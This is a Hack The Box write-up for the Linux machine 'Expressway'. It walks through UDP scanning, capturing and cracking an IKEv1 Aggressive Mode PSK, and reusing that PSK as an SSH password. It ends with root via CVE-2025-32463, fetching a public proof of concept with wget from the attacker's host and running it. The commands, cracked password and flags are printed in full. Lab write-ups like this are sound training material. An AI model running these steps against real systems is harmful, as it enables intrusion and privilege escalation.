# HTB Write-Up: Expressway

| Field | Details |
| --- | --- |
| Platform | [Hack The Box](https://app.hackthebox.com/machines/Expressway) |
| Difficulty | Easy |
| OS | Linux |
| Date | October 26, 2026 |

## Table of Contents

1. [Reconnaissance](#reconnaissance)
2. [Initial Access — IKE Aggressive Mode PSK Capture & Cracking](#initial-access-ike-aggressive-mode-psk-capture-cracking)
3. [Shell Access — SSH Credential Reuse & User Flag](#shell-access-ssh-credential-reuse-user-flag)
4. [Privilege Escalation — CVE-2025-32463 (sudo chroot)](#privilege-escalation-cve-2025-32463-sudo-chroot)

## Reconnaissance

TCP port discovery was performed with **RustScan**:

```bash
rustscan -a 10.129.238.52 --ulimit=5000
```

```
Open 10.129.238.52:22
```

Only SSH on the TCP side — a minimal surface worth checking for UDP services too:

```bash
sudo nmap -sU --top-port=50 10.129.238.52
```

**Result:**

```
PORT     STATE         SERVICE
68/udp   open|filtered dhcpc
69/udp   open|filtered tftp
139/udp  open|filtered netbios-ssn
500/udp  open          isakmp
4500/udp open|filtered nat-t-ike
```

**Port 500/udp (ISAKMP)** confirmed and open is the signal that matters — it means an **IPsec VPN gateway** is active on the host, and with no web service exposed, it's the obvious next target.

## Initial Access — IKE Aggressive Mode PSK Capture & Cracking

### 2.1 — Checking for Aggressive Mode

**IKEv1 Aggressive Mode** is a legacy negotiation mode with a well-known weakness: when a client connects, the server sends its PSK authentication hash before the client has proven its identity — exposing that hash to anyone who asks. **ike-scan** was used to check whether the gateway supports it:

```bash
ike-scan --aggressive --trans=5,2,1,2 10.129.238.52
```

**Result:**

```
Aggressive Mode Handshake returned HDR=(...) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=... (XAUTH) ...
```

The server responded, confirming Aggressive Mode is supported and leaking two useful details: the identity string **`ike@expressway.htb`**, and a flag indicating **XAUTH** is also required — meaning an individual username and password will be needed later, on top of the group PSK.

### 2.2 — Capturing the PSK Hash

With the identity known, the same scan was repeated, this time capturing the server's authentication hash to a file instead of just displaying the handshake:

```bash
ike-scan --aggressive --trans=5,2,1,2 --id=ike@expressway.htb -P vpn_hash.txt 10.129.238.52
```

The PSK parameters came back as a long colon-separated string — the cryptographic material needed to crack the Pre-Shared Key offline, since guessing directly against the server would trigger blocking or rate-limiting.

### 2.3 — Cracking the PSK

The captured hash was saved and run through **Hashcat** against rockyou:

```bash
hashcat -m 5400 hash /usr/share/wordlists/rockyou.txt
```

**Result:**

```
Status...........: Cracked
...freakingrockstarontheroad
```

Recovered Group Pre-Shared Key: **`freakingrockstarontheroad`**.

## Shell Access — SSH Credential Reuse & User Flag

With no web service exposed and only SSH open on TCP, the cracked PSK was worth trying there directly. The leaked identity from the IKE handshake, `ike@expressway.htb`, hinted strongly that a local account named **`ike`** exists on the host:

```bash
ssh ike@10.129.238.52
# Password: freakingrockstarontheroad
```

It worked — whoever configured the VPN reused the same Group PSK as the login password for the `ike` Linux account, letting a credential captured at the network layer (IPsec) carry straight over to the management layer (SSH).

```bash
ike@expressway:~$ cat user.txt
07253c9ae25074a4facb41e95564dbf4
```

## Privilege Escalation — CVE-2025-32463 (sudo chroot)

### 4.1 — Checking Sudo Rights

```bash
sudo -l
# Sorry, user ike may not run sudo on expressway.
```

No explicit sudo rule, but the installed **sudo version** itself turned out to be the path forward:

```bash
sudo --version
```

```
Sudo version 1.9.17
```

This version is vulnerable to **CVE-2025-32463** — a flaw in how sudo handles the `--chroot` option that lets a local user trick sudo into loading an attacker-controlled configuration from within a fake root, resulting in arbitrary command execution as root, with no sudo rule required.

### 4.2 — Running the Exploit

A public PoC was fetched and served to the target:

```bash
git clone https://github.com/kh4sh3i/CVE-2025-32463.git
cd CVE-2025-32463
python3 -m http.server 80
```

```bash
ike@expressway:/tmp$ wget 10.10.14.25/exploit.sh
ike@expressway:/tmp$ chmod +x exploit.sh
ike@expressway:/tmp$ ./exploit.sh
```

```
woot!
root@expressway:/#
```

### 4.3 — Root Flag

```bash
root@expressway:/root# cat root.txt
fedc43519c5d545a4b65da957d9cd01d
```
